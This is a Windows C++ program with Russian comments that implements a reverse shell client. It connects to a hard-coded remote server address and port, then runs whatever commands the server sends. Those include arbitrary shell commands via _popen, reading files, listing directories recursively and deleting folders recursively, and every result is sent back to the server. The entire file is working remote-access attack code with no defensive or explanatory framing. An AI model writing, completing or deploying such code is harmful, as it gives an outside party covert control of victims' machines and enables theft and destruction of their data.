#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <filesystem>
#include <sstream>
#include <fstream>
#include <vector>
#include <array>

#pragma comment(lib, "ws2_32.lib")  // Подключение библиотеки Winsock

#define SERVER_HOST "000.000.000.00"  // IP-адрес сервера
#define SERVER_PORT 9999              // Порт сервера
#define BUFFER_SIZE 1024

std::string executeCommand(const std::string& command) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(_popen(command.c_str(), "r"), _pclose);
    if (!pipe) return "Ошибка выполнения команды.";
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main() {
    WSADATA wsaData;
    int client_socket;
    struct sockaddr_in server_address;
    char buffer[BUFFER_SIZE];

    // Инициализация Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Ошибка: не удалось инициализировать Winsock." << std::endl;
        return 1;
    }

    // Создание сокета
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == INVALID_SOCKET) {
        std::cerr << "Ошибка: не удалось создать сокет." << std::endl;
        WSACleanup();
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(SERVER_PORT);

    // Преобразование IP-адреса
    if (inet_pton(AF_INET, SERVER_HOST, &server_address.sin_addr) <= 0) {
        std::cerr << "Ошибка: некорректный IP-адрес." << std::endl;
        closesocket(client_socket);
        WSACleanup();
        return 1;
    }

    // Подключение к серверу
    if (connect(client_socket, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        std::cerr << "Ошибка: не удалось подключиться к серверу." << std::endl;
        closesocket(client_socket);
        WSACleanup();
        return 1;
    }

    while (true) {
        memset(buffer, 0, BUFFER_SIZE);

        // Получение команды от сервера
        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
        if (bytes_received <= 0) {
            std::cerr << "Ошибка: соединение с сервером потеряно." << std::endl;
            break;
        }

        std::string command(buffer);
        if (command == "exit") {
            std::cout << "[-] Соединение закрыто." << std::endl;
            break;
        }

        std::string response;
        try {
            if (command.substr(0, 2) == "cd") {
                std::string path = command.substr(3);
                std::filesystem::current_path(path);
                response = "Каталог изменён на: " + std::filesystem::current_path().string();
            } else if (command == "dir" || command == "ls") {
                response = "Содержимое каталога:\n";
                for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) {
                    response += entry.path().string() + "\n";
                }
            } else if (command == "dir/s") {
                response = "Рекурсивное содержимое каталога:\n";
                for (const auto& entry : std::filesystem::recursive_directory_iterator(std::filesystem::current_path())) {
                    response += entry.path().string() + "\n";
                }
            } else if (command.substr(0, 5) == "echo ") {
                response = command.substr(5);
            } else if (command.substr(0, 6) == "mkdir ") {
                std::string folder_name = command.substr(6);
                if (std::filesystem::create_directory(folder_name)) {
                    response = "Каталог создан: " + folder_name;
                } else {
                    response = "Ошибка создания каталога.";
                }
            } else if (command.substr(0, 5) == "rmdir") {
                std::string folder_name = command.substr(6);
                if (std::filesystem::remove_all(folder_name)) {
                    response = "Каталог удалён: " + folder_name;
                } else {
                    response = "Ошибка удаления каталога.";
                }
            } else if (command.substr(0, 4) == "type") {
                std::string file_name = command.substr(5);
                std::ifstream file(file_name);
                if (file) {
                    response = "Содержимое файла:\n";
                    std::string line;
                    while (std::getline(file, line)) {
                        response += line + "\n";
                    }
                } else {
                    response = "Ошибка открытия файла.";
                }
            } else {
                response = executeCommand(command);
            }
        } catch (const std::exception& e) {
            response = "Ошибка: " + std::string(e.what());
        }

        // Отправка ответа серверу
        send(client_socket, response.c_str(), response.size(), 0);
    }

    closesocket(client_socket);
    WSACleanup();
    return 0;
}